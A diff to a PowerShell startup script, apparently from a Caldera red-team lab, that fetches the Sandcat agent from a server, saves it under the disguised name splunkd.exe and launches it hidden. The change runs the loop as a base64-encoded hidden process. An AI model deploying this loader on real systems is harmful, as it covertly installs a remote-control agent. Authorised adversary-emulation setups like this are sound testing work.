@@ -1,3 +1,6 @@
+# Detached: the startup scripts run one after another, each to completion, so waiting
+# here for the server would hold every later script until the Caldera server answers.
+$loop = @'
 do {
     try {
         $server="http://${addr}:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
@@ -9,3 +12,6 @@ do {
 } while ($true)
 
 echo "Sandcat agent started"
+'@
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loop))
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile","-EncodedCommand",$enc
